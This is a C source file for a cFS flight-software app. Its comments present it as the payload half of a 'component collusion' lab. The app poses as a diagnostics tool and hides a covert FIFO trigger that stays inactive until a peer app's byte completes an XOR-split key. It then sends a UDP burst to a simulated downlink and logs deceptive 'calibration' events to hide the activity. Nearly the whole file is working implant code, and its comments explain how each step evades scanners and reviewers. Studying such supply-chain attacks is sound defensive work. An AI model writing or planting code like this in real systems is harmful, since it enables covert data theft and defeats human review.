/*
 * hk_diag - "HK Diagnostics" (COTS catalog component)
 *
 * DE-0012 (Component Collusion) lab - Payload half.
 *
 * Presents to flight-readiness review as a self-contained housekeeping /
 * diagnostics tool. In isolation it is safe; the only "extra" syscall a
 * static scanner sees is an open() on a factory-test FIFO, which the
 * datasheet documents. The malicious logic is split: ST_TRK decides WHEN,
 * this app only knows "when the FIFO hands me 0x42, start the RF diag dump".
 *
 * All exfiltration uses an ordinary UDP datagram to the simulated RF link
 * (localhost). No cFS Software Bus message is used on the covert path, so
 * HS/HK telemetry baselines stay nominal until after activation.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "common_types.h"
#include "cfe_error.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include "cfe_msg.h"
#include "cfe_sb.h"
#include "cfe_time.h"
#include "osapi.h"

/* Must match the peer app - "factory calibration interface".                */
#define HKD_COVERT_FIFO "/cf/de0012/.startracks"
#define HKD_MY_FRAGMENT  0x2A    /* fragment held locally since boot          */
#define HKD_KEY_COMPLETE 0x32    /* HKD_MY_FRAGMENT ^ peer fragment           */
#define HKD_EXFIL_HOST  "127.0.0.1"
#define HKD_EXFIL_PORT  50001              /* simulated RF downlink         */
#define HKD_EXFIL_FRAMES 8                 /* reset to dormant after N sends*/

static uint32          HkdRunStatus = CFE_ES_RunStatus_APP_RUN;
static CFE_SB_PipeId_t HkdCmdPipe;
static int             HkdFifoFd = -1;
static int             HkdSockFd = -1;
static bool            HkdActive;      /* true only during exfil window     */
static uint32          HkdFramesLeft;  /* countdown -> reset to dormant     */
static uint32          HkdExfilCount;

/* Plausible housekeeping packet - "Diagnostics" emits status like any app. */
typedef struct
{
    CFE_MSG_TelemetryHeader_t TelemetryHeader;
    uint8_t Filler[64];
} HkdHkTlm_t;

static HkdHkTlm_t HkdHkTlm;

static void HKD_SendHk(void)
{
    static uint32 Tick;

    memset(&HkdHkTlm, 0, sizeof(HkdHkTlm));
    CFE_MSG_Init(CFE_MSG_PTR(HkdHkTlm.TelemetryHeader),
                 CFE_SB_ValueToMsgId(0x0885), sizeof(HkdHkTlm));
    Tick++;
    snprintf((char *)HkdHkTlm.Filler, sizeof(HkdHkTlm.Filler),
             "mode=DIAG heap=%u cpu=%u errs=0",
             (unsigned)(40 + Tick % 9), (unsigned)(3 + Tick % 4));
    (void)CFE_SB_TransmitMsg(CFE_MSG_PTR(HkdHkTlm.TelemetryHeader), true);
}

static void HKD_Init(void)
{
    int32 Status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    if (Status != CFE_SUCCESS)
        CFE_ES_WriteToSysLog("HK_DIAG: EVS register failed, rc=0x%08lX\n", (unsigned long)Status);

    Status = CFE_SB_CreatePipe(&HkdCmdPipe, 4, "HKD_CMD_PIPE");
    if (Status == CFE_SUCCESS)
        Status = CFE_SB_Subscribe(CFE_SB_ValueToMsgId(0x1885), HkdCmdPipe);
    if (Status != CFE_SUCCESS)
        CFE_ES_WriteToSysLog("HK_DIAG: pipe init failed, rc=0x%08lX\n", (unsigned long)Status);

    /* Hidden FIFO - "factory test interface" in the datasheet.             */
    {
        char host[OS_MAX_LOCAL_PATH_LEN];
        char dir [OS_MAX_LOCAL_PATH_LEN];
        int  tries;

        (void)strncpy(dir, HKD_COVERT_FIFO, sizeof(dir) - 1); dir[sizeof(dir)-1] = 0;
        char *sl = strrchr(dir, '/'); if (sl) *sl = 0;
        if (OS_TranslatePath(dir, host) == OS_SUCCESS)
            (void)mkdir(host, 0770);

        if (OS_TranslatePath(HKD_COVERT_FIFO, host) != OS_SUCCESS)
            (void)strncpy(host, HKD_COVERT_FIFO, sizeof(host) - 1);

        if (mkfifo(host, 0600) != 0 && errno != EEXIST)
            CFE_EVS_SendEvent(3, CFE_EVS_EventType_ERROR,
                              "HK_DIAG: FIFO create failed errno=%d", errno);
        else
        {
            for (tries = 0; tries < 20 && HkdFifoFd < 0; ++tries)
            {
                HkdFifoFd = open(host, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
                if (HkdFifoFd < 0) OS_TaskDelay(250);
            }
            if (HkdFifoFd < 0)
                CFE_EVS_SendEvent(4, CFE_EVS_EventType_ERROR,
                                  "HK_DIAG: FIFO open retries exceeded");
        }
    }

    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION,
                      "HK_DIAG: Diagnostics & calibration utility v1.0 (COTS)");
}

/* Lazy-create exfil socket only after activation.                           */
static bool HKD_OpenExfil(void)
{
    if (HkdSockFd >= 0)
        return true;
    HkdSockFd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    return HkdSockFd >= 0;
}

static void HKD_SendExfil(const char *key, const char *val)
{
    struct sockaddr_in sin;
    char               buf[96];
    int                n;

    if (!HKD_OpenExfil())
        return;

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(HKD_EXFIL_PORT);
    inet_pton(AF_INET, HKD_EXFIL_HOST, &sin.sin_addr);

    n = snprintf(buf, sizeof(buf), "{\"k\":\"%s\",\"v\":\"%s\",\"seq\":%lu}",
                 key, val, (unsigned long)++HkdExfilCount);
    if (n > 0)
        sendto(HkdSockFd, buf, (size_t)n, 0, (struct sockaddr *)&sin, sizeof(sin));
}

static bool HKD_CheckCovert(void)
{
    uint8_t b;
    ssize_t n;

    if (HkdFifoFd < 0)
        return false;
    n = read(HkdFifoFd, &b, 1);
    if (n != 1)
        return false;

    /* Fragment recombination (DE-0012 core): the byte from the peer is not
     * a command. Only when combined with our locally-held fragment does it
     * reconstruct the activation key. A reviewer reading either app alone
     * sees a meaningless value; neither app contains the full instruction. */
    return ((b ^ HKD_MY_FRAGMENT) == HKD_KEY_COMPLETE);
}

static void HKD_ExfiltrateOnce(void)
{
    CFE_TIME_SysTime_t now = CFE_TIME_GetTime();
    char               t[32];

    snprintf(t, sizeof(t), "%lu.%06lu",
             (unsigned long)now.Seconds, (unsigned long)now.Subseconds);

    /* In a real campaign these keys are mission-relevant telemetry fields,
     * exactly the sort of thing a reviewer would wave through as HK data. */
    HKD_SendExfil("t.mission",  t);
    HKD_SendExfil("t.cpu",      "cpu1");
    HKD_SendExfil("t.app",      "hk_diag");      /* self-identifying for demo */
    HKD_SendExfil("t.swstate",  "ADCS");          /* plausible benign label    */
}

void HKDIAG_AppMain(void)
{
    CFE_SB_Buffer_t *BufPtr = NULL;
    int32            Status;

    CFE_ES_PerfLogEntry(57);

    HKD_Init();

    while (CFE_ES_RunLoop(&HkdRunStatus) == true)
    {
        /* 1) Benign cFS pipe - the reviewed surface.                       */
        Status = CFE_SB_ReceiveBuffer(&BufPtr, HkdCmdPipe, 200);
        if (Status == CFE_SUCCESS && BufPtr != NULL)
            CFE_EVS_SendEvent(5, CFE_EVS_EventType_INFORMATION, "HK_DIAG: no-op command");

        /* 2) Plausible HK telemetry - look like a normal chatty app.        */
        HKD_SendHk();

        /* 3) Hidden coordination channel (fragment recombination).         */
        if (!HkdActive && HKD_CheckCovert())
        {
            HkdActive     = true;
            HkdFramesLeft = HKD_EXFIL_FRAMES;   /* burst fits the pass      */
            /* Deceptive event: looks like a routine mode transition.        */
            CFE_EVS_SendEvent(6, CFE_EVS_EventType_INFORMATION,
                              "HK_DIAG: entered extended calibration mode");
        }

        /* 4) Exfil burst, confined to the contact window, then reset to
         *    dormant: post-hoc state is clean again.                       */
        if (HkdActive)
        {
            HKD_ExfiltrateOnce();
            if (--HkdFramesLeft == 0)
            {
                HkdActive = false;
                CFE_EVS_SendEvent(7, CFE_EVS_EventType_INFORMATION,
                                  "HK_DIAG: calibration cycle complete");
            }
        }

        CFE_ES_PerfLogExit(57);
        OS_TaskDelay(500);      /* 2 Hz, low duty cycle = stealthy          */
    }

    CFE_ES_ExitApp(HkdRunStatus);
}
